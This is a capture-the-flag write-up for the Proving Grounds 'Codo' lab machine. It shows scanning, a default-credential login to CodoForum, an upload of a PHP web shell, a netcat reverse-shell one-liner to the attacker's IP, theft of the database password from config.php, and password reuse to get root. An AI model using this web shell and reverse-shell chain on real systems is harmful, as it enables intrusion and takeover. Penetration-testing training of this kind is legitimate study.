---
layout: default
title: Codo
parent: Proving Grounds Practice - Linux
nav_order: 9
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/codo]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.246.23
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-28 08:45 EST
Nmap scan report for 192.168.246.23
Host is up (0.058s latency).
Not shown: 65533 filtered tcp ports (no-response)
Bug in http-generator: no string output.
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: All topics | CODOLOGIC
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.88 seconds

```

# Enumeration

---

## 80 | HTTP

![index](../../../assets/images/ctfs/proving_grounds/codo/index.png)

Gobuster reveals _/admin_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE]
└─$ gobuster dir -u http://192.168.246.23 -w /usr/share/wordlists/custom/large_final.txt -x aspx,php,txt
,conf -t 80 -k                                                                                          ===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
                                                                 ===============================================================
2023/11/28 08:52:57 Starting gobuster in directory enumeration mode                                     ===============================================================
/admin                (Status: 301) [Size: 316] [--> http://192.168.246.23/admin/]
```

There is a login page that allows authentication with default creds _admin:admin_ for the CodoForum site.

![logon](../../../assets/images/ctfs/proving_grounds/codo/logon.png)

Checking searchploit there is a a RCE for the current version V.5.1

The exploit states a malicious php file can be uploaded to _global settings -> change forum logo -> upload_

# Exploitation

---

We will craft a PHP reverse shell and upload to the vulnerable path.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/codo]
└─$ cat cmd.php
GIF8;
<?php
echo "<pre>";
passthru($_GET['cmd']);
echo "</pre>";
?>

```

![upload](../../../assets/images/ctfs/proving_grounds/codo/upload.png)

Now we can trigger at the path *http://192.168.246.23/sites/default/assets/img/attachments/cmd.php?cmd=id*

![id](../../../assets/images/ctfs/proving_grounds/codo/id.png)

Generate a reverse shell onliner and URLencode

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/codo]
└─$ revshellgen -i 192.168.45.217 -p 4444 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 4444 1>/tmp/l

# URL encoded
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%204444%201%3E%2Ftmp%2Fl
```

Now we execute in the PHP web shell and catch a reverse shell on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/codo]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.246.23] 54160
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Check for Config.php

We find MySQL creds in _/var/www/html/sites/default/config.php_

```bash
www-data@codo:/var/www/html/sites/default$ cat config.php
cat config.php
<?php

/*
 * @CODOLICENSE
 */

defined('IN_CODOF') or die();

$CF_installed=true;

function get_codo_db_conf() {


    $config = array (
  'driver' => 'mysql',
  'host' => 'localhost',
  'database' => 'codoforumdb',
  'username' => 'codo',
  'password' => 'FatPanda123',
  'prefix' => '',
  'charset' => 'utf8',
  'collation' => 'utf8_unicode_ci',
);

    return $config;
}

$DB = get_codo_db_conf();

$CONF = array (

  'driver' => 'Custom',
  'UID'    => '631042af544ef',
  'SECRET' => '631042af544f0',
  'PREFIX' => ''
);

```

Logon to the local MySQL service

```bash
www-data@codo:/var/www/html/sites/default$ mysql -ucodo -p
mysql -ucodo -p
Enter password: FatPanda123

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 43
Server version: 10.3.38-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| codoforumdb        |
| information_schema |
+--------------------+
2 rows in set (0.000 sec)

```

We have some credentials with a clear text password apparently.

```bash
MariaDB [codoforumdb]> select * from codo_users;
select * from codo_users;
+----+-----------+-----------+--------------------------------------------------------------+-------+---------------------+------------+-------------+-----------+-------------+-------------------+-----------+----------+---------------+----------+------------+-----------------------------+
| id | username  | name      | pass                                                         | token | mail                | created    | last_access | read_time | user_status | avatar            | signature | no_posts | profile_views | oauth_id | reputation | last_notification_view_time |
+----+-----------+-----------+--------------------------------------------------------------+-------+---------------------+------------+-------------+-----------+-------------+-------------------+-----------+----------+---------------+----------+------------+-----------------------------+
|  1 | admin     | admin     | $2a$08$NxmF1vhrsnMypsJ1fJkR5OyxtBLWDChyHS4sAT.6ue6SyR2rbmFvS | NULL  | admin@codo.pg       | 1662010038 |  1701193057 |         0 |           1 | 6488ee7e82484.png |           |        1 |             2 | 0        |          0 |                           0 |
|  2 | anonymous | Anonymous | youJustCantCrackThis                                         |       | anonymous@localhost | 1662010038 |  1662010038 |         0 |           0 |                   |           |        0 |             0 | 0        |          0 |                           0 |
+----+-----------+-----------+--------------------------------------------------------------+-------+---------------------+------------+-------------+-----------+-------------+-------------------+-----------+----------+---------------+----------+------------+-----------------------------+

```

## Use Discover Creds to SU to Root

The discovered password in _config.php_ allows us to swich user to _root_

```bash
www-data@codo:/var/www/html/sites/default/assets/img/attachments$ su root
su root
Password: FatPanda123

root@codo:/var/www/html/sites/default/assets/img/attachments# id
id
uid=0(root) gid=0(root) groups=0(root)

```
